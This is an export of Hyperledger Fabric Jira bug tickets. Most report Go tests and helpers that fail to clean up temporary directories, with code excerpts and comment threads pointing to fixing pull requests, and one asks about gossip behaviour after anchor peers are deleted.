Some test(s) using TestEnv from kvledger/bookeeping/test_exports are not cleaning up,FAB-17149,43463,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,SamYuan1990,sykesm,sykesm,27/Nov/19 12:54 AM,17/Jan/20 3:41 AM,28/Oct/23 3:09 AM,17/Jan/20 3:41 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-ledger,,,,,,,,,0,help-wanted,,,,,"My tmpfs filled up today. When I looked at the directory entries, I found hundreds of directories like this:

{code}
bookkeep728418616                                                                                                                                                                    
bookkeep728538393                                                                                                                                                                    
bookkeep728665212                                                                                                                                                                    
bookkeep729158493                                                                                                                                                                    
bookkeep729472634                                                                                                                                                                    
bookkeep729680717                                                                                                                                                                    
bookkeep730930575                                                                                                                                                                    
bookkeep731151148                                                                                                                                                                    
bookkeep731594777                                                                                                                                                                    
bookkeep732084507                                                                                                                                                                    
bookkeep733935366                                                                                                                                                                    
bookkeep734021180                                                                                                                                                                    
bookkeep734563843                                                                                                                                                                    
bookkeep735016345                                                                                                                                                                    
bookkeep735781202                                                                                                                                                                    
bookkeep738221388                                                                                                                                                                    
bookkeep738355796                                                                                                                                                                    
bookkeep738415002                                                                                                                                                                    
bookkeep738471849                                                                                                                                                                    
bookkeep739233366                                                                                                                                                                    
bookkeep741195179                                                                                                                                                                    
bookkeep741820148                                                                                                                                                                    
bookkeep741872069                                                                                                                                                                    
bookkeep743326330                                                                                                                                                                    
bookkeep744359792                                                                                                                                                                    
bookkeep745486185                                                                                                                                                                    
bookkeep745581451                                                                                                                                                                    
bookkeep747394076                                                                                                                                                                    
bookkeep747449837                                                                                                                                                                    
bookkeep748419749                                                                                                                                                                    
bookkeep750209949                                                                                                                                                                    
bookkeep750785581                                                                                                                                                                    
bookkeep751378795                                                                                                                                                                    
bookkeep751762031                                                                                                                                                                    
bookkeep751804935                                                                                                                                                                    
bookkeep751836555                                                                                                                                                                    
bookkeep752020079                                                                                                                                                                    
bookkeep752070527                                                                                                                                                                    
bookkeep752230068                                                                                                                                                                    
bookkeep752766759                                                                                                                                                                    
bookkeep753094979                                                                                                                                                                    
bookkeep754021547                                                                                                                                                                    
bookkeep755580477                                                                                                                                                                    
{code}

It appears this is coming from the code in kvledger/bookeeping/test_exports:
{code}
// NewTestEnv construct a TestEnv for testing
func NewTestEnv(t testing.TB) *TestEnv {
	dbPath, err := ioutil.TempDir("""", ""bookkeep"")
	require.NoError(t, err)
	provider, err := NewProvider(dbPath)
	require.NoError(t, err)
	return &TestEnv{t, provider, dbPath}
}
{code}

There is a {{Cleanup}} method on the object that should delete the temporary directory but it does not look like it's being called as appropriate.

---
Looks like the following use NewTestEnv
{code}
core/ledger/kvledger/txmgmt/pvtstatepurgemgmt/expiry_keeper_test.go
core/ledger/kvledger/txmgmt/pvtstatepurgemgmt/purge_mgr_test.go
core/ledger/kvledger/txmgmt/txmgr/lockbasedtxmgr/pkg_test.go
core/ledger/kvledger/txmgmt/privacyenabledstate/test_exports.go
core/ledger/kvledger/txmgmt/privacyenabledstate/optimization_test.go
core/ledger/kvledger/history/pkg_test.go
{code}
",,guoger,manish-sethi,SamYuan1990,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwrme:u",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),guoger,manish-sethi,SamYuan1990,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"02/Dec/19 9:35 PM;SamYuan1990;I only find bookkeeper folder in temp dir and it was been cleaned up... could you give me a script to reproduce this ticket?;;;","02/Dec/19 9:48 PM;SamYuan1990;I used go test -v .;;;","03/Dec/19 12:25 AM;guoger;[~SamYuan1990] what i would do is to give tmpdir the name of test: {{TempDir("""", fmt.Sprintf(""test-env-%s-"", t.Name()))}}, and run test in kvledger dir, and see what's left in tmp (with test name)

;;;","03/Dec/19 2:30 PM;SamYuan1990;I reproduced via go test ./...;;;","18/Dec/19 11:10 AM;SamYuan1990;[~sykesm], could you please help look at https://github.com/hyperledger/fabric/pull/351, not sure we depends on manish-sethi or not.;;;","17/Jan/20 3:41 AM;manish-sethi;Fixed in [https://github.com/hyperledger/fabric/pull/415];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
cscc/configure_test does not clean up temporary directories,FAB-17150,43464,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tatsu-sato,sykesm,sykesm,27/Nov/19 1:06 AM,19/May/20 7:04 AM,28/Oct/23 3:09 AM,19/May/20 7:04 AM,v2.0.0,,,,,,,,,,,,,fabric-peer,,,,,,,,,0,help-wanted,,,,,"My tmpfs filled up today. When I listed the directories, there were several entries that looked like these:
{code}
drwx------   9 sykesm sykesm  4096 Oct 24 15:26 cscc_test058567791
drwx------   9 sykesm sykesm  4096 Jul 30 15:50 cscc_test064949782
drwx------   8 sykesm sykesm  4096 Jul 24 13:19 cscc_test078554342
drwx------   9 sykesm sykesm  4096 Nov 14 15:26 cscc_test086041472
drwx------   9 sykesm sykesm  4096 Oct 31 19:04 cscc_test153886881
drwx------   8 sykesm sykesm  4096 Jul 16 15:10 cscc_test181473078
drwx------   9 sykesm sykesm  4096 Aug 12 19:27 cscc_test196755407
drwx------   9 sykesm sykesm  4096 Nov  6 16:49 cscc_test204226513
drwx------   9 sykesm sykesm  4096 Oct 14 18:09 cscc_test262909633
drwx------   9 sykesm sykesm  4096 Oct 24 13:58 cscc_test264855044
drwx------   9 sykesm sykesm  4096 Oct 24 13:26 cscc_test308657220
drwx------   9 sykesm sykesm  4096 Aug  6 18:10 cscc_test312287942
drwx------   9 sykesm sykesm  4096 Nov 19 11:19 cscc_test398739912
drwx------   9 sykesm sykesm  4096 Nov  5 20:04 cscc_test411452435
drwx------   9 sykesm sykesm  4096 Nov 22 22:01 cscc_test499988328
drwx------   9 sykesm sykesm  4096 Nov  2 00:29 cscc_test516473353
drwx------   9 sykesm sykesm  4096 Aug  5 17:41 cscc_test571248380
drwx------   9 sykesm sykesm  4096 Nov 21 12:10 cscc_test666870802
drwx------   9 sykesm sykesm  4096 Nov 12 14:27 cscc_test721214527
drwx------   9 sykesm sykesm  4096 Sep 11 13:22 cscc_test849963017
drwx------   9 sykesm sykesm  4096 Nov  5 18:49 cscc_test894630645
drwx------   9 sykesm sykesm  4096 Oct 28 19:34 cscc_test951707059
{code}

It appears these are temporary directories created in the following code block:
{code}
func TestConfigerInvokeJoinChainCorrectParams(t *testing.T) {
	viper.Set(""chaincode.executetimeout"", ""3s"")

	testDir, err := ioutil.TempDir("""", ""cscc_test"")
	require.NoError(t, err, ""error in creating test dir"")
	defer os.Remove(testDir)
{code}

Notice that {{os.Remove}} is used; this is not the correct function to use. Since we're dealing with a directory, we should be using {{os.RemoveAll}}.

When I looked inside the directories, I saw a number of directories and files that looked related to the ledger.",,baidang201,sykesm,tatsu-sato,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015cz:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),baidang201,sykesm,tatsu-sato,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Some test(s) that use privacyenabledstate.LevelDBCommonStorageTestEnv are not cleaning up temporary directories,FAB-17151,43465,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,SamYuan1990,sykesm,sykesm,27/Nov/19 1:13 AM,17/Jan/20 3:40 AM,28/Oct/23 3:09 AM,17/Jan/20 3:40 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-ledger,,,,,,,,,0,help-wanted,,,,,"My tmpfs filled up today. When I looked in the directory, I found hundreds of entries that looked like this:
{code}
cstestenv072366535
cstestenv074520508
cstestenv076032059
cstestenv077341542
cstestenv091877446
cstestenv104409189
cstestenv104890682
cstestenv115057085
cstestenv120858038
cstestenv125365950
cstestenv126977062
cstestenv138696046
cstestenv153095697
cstestenv164608714
cstestenv181554453
cstestenv183530194
cstestenv188863274
cstestenv196294917
cstestenv224370685
cstestenv288701315
cstestenv312191459
cstestenv313577638
cstestenv329698434
cstestenv331762666
cstestenv341185534
cstestenv350604082
cstestenv365473810
cstestenv379606714
cstestenv384572262
{code}

It appears these directories are being created by the following test helper code in the privacyenabledstate package:
{code}
// Init implements corresponding function from interface TestEnv
func (env *LevelDBCommonStorageTestEnv) Init(t testing.TB) {
	dbPath, err := ioutil.TempDir("""", ""cstestenv"")
	if err != nil {
		t.Fatalf(""Failed to create level db storage directory: %s"", err)
	}
{code}

There is a corresponding {{Cleanup}} method on {{LevelDBCommonStorageTestEnv}} but one or more tests do not appear to be calling it.

The following files seem to reference the helper object:
{code}
core/ledger/kvledger/txmgmt/validator/internal/tx_ops_preparation_test.go
core/ledger/kvledger/txmgmt/validator/statebasedval/state_based_validator_test.go
core/ledger/kvledger/txmgmt/validator/valimpl/helper_test.go
core/ledger/kvledger/txmgmt/validator/internal/val_test.go
core/ledger/kvledger/txmgmt/pvtstatepurgemgmt/purge_mgr_test.go
core/ledger/kvledger/txmgmt/txmgr/lockbasedtxmgr/pkg_test.go
core/ledger/kvledger/history/pkg_test.go
{code}",,manish-sethi,SamYuan1990,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwrme:zc",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,SamYuan1990,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"02/Dec/19 9:33 PM;SamYuan1990;could you give me a reproduce steps for this ticket?
well, by default I had added defer os.removeAll to clean up the dir. further I noticed that the clean up function been invoked. So I am try to reproduce this ticket to see temp folder on my laptop, but I can't get it....;;;","02/Dec/19 9:47 PM;SamYuan1990;I used go test -v .;;;","03/Dec/19 2:30 PM;SamYuan1990;I reproduced via go test ./...;;;","17/Jan/20 3:40 AM;manish-sethi;Fixed in [https://github.com/hyperledger/fabric/pull/415];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Some test(s) that use privacyenabledstate.CouchDBCommonStorageTestEnv are not cleaning up temporary directories,FAB-17152,43466,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,SamYuan1990,sykesm,sykesm,27/Nov/19 1:22 AM,17/Jan/20 3:40 AM,28/Oct/23 3:09 AM,17/Jan/20 3:40 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-ledger,,,,,,,,,0,help-wanted,,,,,"My tmpfs filled up today. When I looked in the directory, I found hundreds of entries that looked like this:
{code}
pestate660347830
pestate662698575
pestate664059191
pestate677971184
pestate678516704
pestate680364592
pestate685411140
pestate693618452
pestate694123046
pestate702821191
pestate703138853
pestate703989889
pestate706432447
pestate707826779
pestate708236255
pestate709956924
pestate712969640
pestate726390744
pestate729057548
pestate730679330
pestate745920468
pestate749794677
pestate768789859
pestate777324466
pestate779072981
pestate779695280
pestate781694732
pestate791410355
pestate798968419
pestate813676081
pestate817810128
pestate818452395
pestate825280492
pestate825408654
pestate828090446
pestate856214361
pestate861195848
pestate875184842
pestate893957615
pestate895580659
pestate903649160
pestate903838478
pestate911274602
pestate912757775
{code}

It appears these directories are bing created by the following test helper code in the privacyenabledstate package:
{code}
// Init implements corresponding function from interface TestEnv
func (env *CouchDBCommonStorageTestEnv) Init(t testing.TB) {
	redoPath, err := ioutil.TempDir("""", ""pestate"")
	if err != nil {
		t.Fatalf(""Failed to create redo log directory: %s"", err)
	}
{code}

There is a corresponding {{Cleanup}} method on {{CouchDBCommonStorageTestEnv}} but one or more tests do not appear to be calling it.

The following files reference the helper object:
{code}
core/ledger/kvledger/txmgmt/validator/statebasedval/state_based_validator_test.go
core/ledger/kvledger/txmgmt/pvtstatepurgemgmt/purge_mgr_test.go
core/ledger/kvledger/txmgmt/txmgr/lockbasedtxmgr/pkg_test.go
core/ledger/kvledger/txmgmt/privacyenabledstate/test_exports.go
core/ledger/kvledger/txmgmt/privacyenabledstate/db_test.go
{code}",,dereckluo,guoger,manish-sethi,SamYuan1990,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwrme:x",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),dereckluo,guoger,manish-sethi,SamYuan1990,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"02/Dec/19 9:33 PM;SamYuan1990;could you give me a reproduce steps for this ticket?
well, by default I had added defer os.removeAll to clean up the dir. further I noticed that the clean up function been invoked. So I am try to reproduce this ticket to see temp folder on my laptop, but I can't get it....;;;","02/Dec/19 9:47 PM;SamYuan1990;I used go test -v .;;;","02/Dec/19 11:50 PM;guoger;[~SamYuan1990] i believe you could just run that test as is and see tmpdir being left after test;;;","03/Dec/19 2:30 PM;SamYuan1990;I reproduced via go test ./...;;;","09/Jan/20 6:04 AM;manish-sethi;This issue and other related opened issues - FAB-17149 and FAB-17151 appears to stem from the changes made in these two CRs.

[https://gerrit.hyperledger.org/r/#/c/fabric/+/31417/]

[https://gerrit.hyperledger.org/r/#/c/fabric/+/31543/]

In these CRs, all the cleanup calls from individual tests were removed. [~dereckluo] had worked on fixing these. He has submitted a couple PRs that are merged (a little premature though). He is working on another PR for fixing some more issues. [~dereckluo] can you take make sure that the problem mentioned in this and other related Jiras has been reversed with your PRs.;;;","10/Jan/20 12:10 AM;dereckluo;As I went back and double checked, ledger unit test cleanup has been fixed in this PR: https://github.com/hyperledger/fabric/pull/415
It fixed the issue that mentioned in all three jira : [FAB-17152|https://jira.hyperledger.org/browse/FAB-17152], [FAB-17149|https://jira.hyperledger.org/browse/FAB-17149] and [FAB-17151|https://jira.hyperledger.org/browse/FAB-17151]

;;;","10/Jan/20 12:41 AM;manish-sethi;Thanks [~dereckluo] for confirming this;;;","17/Jan/20 3:40 AM;manish-sethi;Fixed in [https://github.com/hyperledger/fabric/pull/415];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test_WriteFolderToTarPackageFailure4 prevents cleanup of temporary directory used by test,FAB-17153,43467,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,baidang201,sykesm,sykesm,27/Nov/19 1:29 AM,08/Jul/20 12:07 PM,28/Oct/23 3:09 AM,01/Dec/19 10:45 PM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-peer,,,,,,,,,0,help-wanted,,,,,"My tmpfs filled up today. While I was looking through the contents I noticed a handful of entires like this:
{code}
drw-r--r-- 2 sykesm sykesm 4096 Oct 14 17:56 WriteFolderToTarPackageFailure4BadFileMode105951842
drw-r--r-- 2 sykesm sykesm 4096 Nov 12 14:15 WriteFolderToTarPackageFailure4BadFileMode261939118
drw-r--r-- 2 sykesm sykesm 4096 Oct 24 13:13 WriteFolderToTarPackageFailure4BadFileMode311178017
drw-r--r-- 2 sykesm sykesm 4096 Oct 31 18:53 WriteFolderToTarPackageFailure4BadFileMode354042733
drw-r--r-- 2 sykesm sykesm 4096 Nov  5 18:31 WriteFolderToTarPackageFailure4BadFileMode705955383
drw-r--r-- 2 sykesm sykesm 4096 Oct 24 15:15 WriteFolderToTarPackageFailure4BadFileMode867083399
{code}

There were only a few entries but I assume that's because this test was only added in September.

It appears this is coming from this test in core/chaincode/platforms/util/writer_test:
{code}
func Test_WriteFolderToTarPackageFailure4(t *testing.T) {
	tempDir, err := ioutil.TempDir("""", ""WriteFolderToTarPackageFailure4BadFileMode"")
	require.NoError(t, err)
	defer os.RemoveAll(tempDir)
	testFile := filepath.Join(tempDir, ""test.java"")
	err = ioutil.WriteFile(testFile, []byte(""Content""), 0644)
	require.NoError(t, err, ""Error creating file"", testFile)
	err = os.Chmod(tempDir, 0644)
	require.NoError(t, err)

	buf := bytes.NewBuffer(nil)
	tw := tar.NewWriter(buf)
	defer tw.Close()

	err = WriteFolderToTarPackage(tw, tempDir, []string{}, nil, nil)
	assert.Error(t, err, ""Should have received error writing folder to package"")
	assert.Contains(t, err.Error(), ""permission denied"")
}
{code}
changes the permission of the temporary directory to 0644. By making this change, the {{defer os.RemoveAll(tempDir)}} call may not succeed.

Either the directory permissions need to be restored or a subdirectory needs to be created.",,ales,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015dn:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),ales,sykesm,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"01/Dec/19 10:46 PM;ales;https://github.com/hyperledger/fabric/pull/335;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
 Deleting anchor peers is probably not working as inter org private data over gossip continues to work,FAB-17154,43468,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Works as Expected,,nileshdeotale,nileshdeotale,27/Nov/19 1:57 AM,27/Nov/19 3:42 AM,28/Oct/23 3:09 AM,27/Nov/19 3:22 AM,,,,,,,,,,,,,,fabric-peer,,,,,,,,,0,,,,,,"Steps:

Create 2 Org network.
 Org1 with org1peer1 and org1peer2
 Org2 with org2peer1

Install marbles_private_go chaincode

Create channel and instantiate marbles_private_go chaincode and collections with both org1 and org2 msps getting marbles and marbles private collection on the channel

Set org1peer1 and org2peer1 as anchor peers

Send invokes (initMarble) only to org1peer1

Confirm that Marble and Marble private details are on org1peer1, org1peer2, org2peer1
 org2peer1 gets data over gossip using anchor peers and external endpoints, as expected.

Delete Anchor peers to delete anchor peers.

Repeat step 5.

Observed that private data is still seen in org2peer1, possibly due to it fetching it via gossip.

 org2peer1 should have failed to fetch this with no anchor peers on the channel, yet it got the private data as seen in marble and marble private details table in couchdb.",,nileshdeotale,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015dv:",,,,Unset,Unset,,"(Please add steps to reproduce)Steps:

Create 2 Org network.
Org1 with org1peer1 and org1peer2
Org2 with org2peer1

Install marbles_private_go chaincode

Create channel and instantiate marbles_private_go chaincode and collections with both org1 and org2 msps getting marbles and marbles private collection on the channel

Set org1peer1 and org2peer1 as anchor peers

Send invokes (initMarble) only to org1peer1

Confirm that Marble and Marble private details are on org1peer1, org1peer2, org2peer1
org2peer1 gets data over gossip using anchor peers and external endpoints, as expected.

Delete Anchor peers to delete anchor peers.

Repeat step 5.

Observed that private data is still seen in org2peer1, possibly due to it fetching it via gossip.

 org2peer1 should have failed to fetch this with no anchor peers on the channel, yet it got the private data as seen in marble and marble private details table in couchdb.",,Unset,,,,,,Unset,,Unset,,(Please add usage information),nileshdeotale,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Nov/19 3:22 AM;yacovm;Once the peers from different organizations know each other, they don't care whether the anchor peers exist in the config block or even if the anchor peers are online.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"The ""fabric-run"" temporary directory for external chaincode is not cleaned up",FAB-17155,43469,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,sykesm,sykesm,27/Nov/19 3:05 AM,01/Jul/20 7:30 PM,28/Oct/23 3:09 AM,13/May/20 10:49 PM,v2.0.0,,,,,,,,,v2.2.0,,,,fabric-peer,,,,,,,,,0,ipm,,,,,"My tmpfs ran out of space today. While looking through the temp directory, I noticed several directories that look like this:
{code}
drwx------ 2 sykesm sykesm 4096 Nov 26 17:14 fabric-run603673869
drwx------ 2 sykesm sykesm 4096 Nov 26 17:41 fabric-run624417420
drwx------ 2 sykesm sykesm 4096 Nov 26 17:34 fabric-run652706040
drwx------ 2 sykesm sykesm 4096 Nov 26 17:18 fabric-run654902945
drwx------ 2 sykesm sykesm 4096 Nov 26 16:57 fabric-run666202755
drwx------ 2 sykesm sykesm 4096 Nov 26 17:00 fabric-run680736876
drwx------ 2 sykesm sykesm 4096 Nov 26 17:33 fabric-run682985070
drwx------ 2 sykesm sykesm 4096 Nov 26 17:17 fabric-run700999953
drwx------ 2 sykesm sykesm 4096 Nov 26 17:41 fabric-run708670214
drwx------ 2 sykesm sykesm 4096 Nov 26 17:24 fabric-run709521898
drwx------ 2 sykesm sykesm 4096 Nov 26 17:27 fabric-run709732153
drwx------ 2 sykesm sykesm 4096 Nov 26 17:36 fabric-run719357960
drwx------ 2 sykesm sykesm 4096 Nov 26 17:17 fabric-run766972010
drwx------ 2 sykesm sykesm 4096 Nov 26 17:17 fabric-run783044266
drwx------ 2 sykesm sykesm 4096 Nov 26 17:17 fabric-run784857690
drwx------ 2 sykesm sykesm 4096 Nov 26 17:17 fabric-run787047340
drwx------ 2 sykesm sykesm 4096 Nov 26 17:18 fabric-run796470727
drwx------ 2 sykesm sykesm 4096 Nov 26 17:22 fabric-run805138893
drwx------ 2 sykesm sykesm 4096 Nov 26 17:47 fabric-run807247438
drwx------ 2 sykesm sykesm 4096 Nov 26 17:37 fabric-run809467179
drwx------ 2 sykesm sykesm 4096 Nov 26 17:52 fabric-run827966850
{code}

The code that creates the directory looks like this:
{code}
// Run starts the `run` script and returns a Session that can be used to
// signal it and wait for termination.
func (b *Builder) Run(ccid, bldDir string, peerConnection *ccintf.PeerConnection) (*Session, error) {
	launchDir, err := ioutil.TempDir("""", ""fabric-run"")
	if err != nil {
		return nil, errors.WithMessage(err, ""could not create temp run dir"")
	}

	rc := newRunConfig(ccid, peerConnection)
	marshaledRC, err := json.Marshal(rc)
	if err != nil {
		return nil, errors.WithMessage(err, ""could not marshal run config"")
	}

	if err := ioutil.WriteFile(filepath.Join(launchDir, ""chaincode.json""), marshaledRC, 0600); err != nil {
		return nil, errors.WithMessage(err, ""could not write root cert"")
	}

	run := filepath.Join(b.Location, ""bin"", ""run"")
	cmd := b.NewCommand(run, bldDir, launchDir)
	sess, err := Start(b.Logger, cmd)
	if err != nil {
		os.RemoveAll(launchDir)
		return nil, errors.Wrapf(err, ""builder '%s' run failed to start"", b.Name)
	}

	go func() {
		defer os.RemoveAll(launchDir)
		sess.Wait()
	}()

	return sess, nil
}
{code}

We should investigate what we can do to get these temporary directories cleaned up. There's a defer that waits for the run session to complete before cleanup but my guess is that peer is being terminated while the chaincode is running so the deferred function does not run.

If this theory is correct, we'll need to find a way to more cleanly terminate chaincode when the peer is signaled so we can clean things up.",,sykesm,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzxu",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,wlahti,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"06/Apr/20 6:39 AM;wlahti;https://github.com/hyperledger/fabric/pull/999;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Temporary directory created by orderer test is not cleaned up,FAB-17156,43470,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,SamYuan1990,sykesm,sykesm,27/Nov/19 3:09 AM,02/Dec/19 5:08 PM,28/Oct/23 3:09 AM,02/Dec/19 5:08 PM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-orderer,,,,,,,,,0,help-wanted,,,,,"My tmpfs ran out of space today. While looking through the contents, I noticed several directories with ""main_test-"" in the name.

The following test:
{code}
func TestInitializeBootstrapChannel(t *testing.T) {
	cleanup := configtest.SetDevFabricConfigPath(t)
	defer cleanup()

	genesisFile := produceGenesisFile(t, genesisconfig.SampleSingleMSPSoloProfile, ""testchannelid"")
	defer os.Remove(genesisFile)

	fileLedgerLocation, _ := ioutil.TempDir("""", ""main_test-"")
	ledgerFactory, _, err := createLedgerFactory(
		&localconfig.TopLevel{
			FileLedger: localconfig.FileLedger{
				Location: fileLedgerLocation,
			},
		},
		&disabled.Provider{},
	)
	assert.NoError(t, err)
	bootstrapConfig := &localconfig.TopLevel{
		General: localconfig.General{
			GenesisMethod: ""file"",
			BootstrapFile: genesisFile,
		},
	}

	bootstrapBlock := extractBootstrapBlock(bootstrapConfig)
	initializeBootstrapChannel(bootstrapBlock, ledgerFactory)

	ledger, err := ledgerFactory.GetOrCreate(""testchannelid"")
	assert.NoError(t, err)
	assert.Equal(t, uint64(1), ledger.Height())
}
{code}
creates a temporary directory but does not clean it up.",,SamYuan1990,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015eb:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),SamYuan1990,sykesm,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"01/Dec/19 9:19 PM;SamYuan1990;https://github.com/hyperledger/fabric/pull/334;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Temporary directories created by orderer TestCreateTempDir tests are not cleaned up,FAB-17157,43471,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,guoger,sykesm,sykesm,27/Nov/19 3:14 AM,28/Nov/19 11:54 PM,28/Oct/23 3:09 AM,28/Nov/19 11:54 PM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-orderer,,,,,,,,,0,help-wanted,,,,,"This test:
{code}
func TestCreateTempDir(t *testing.T) {
	t.Run(""Good"", func(t *testing.T) {
		tempDir := createTempDir(""foo"")
		if _, err := os.Stat(tempDir); err != nil {
			t.Fatal(err)
		}
	})

	t.Run(""Bad"", func(t *testing.T) {
		assert.Panics(t, func() {
			createTempDir(""foo/bar"")
		})
	})

}
{code}
does not cleanup after itself. It leaves garbage behind in the temporary directory.

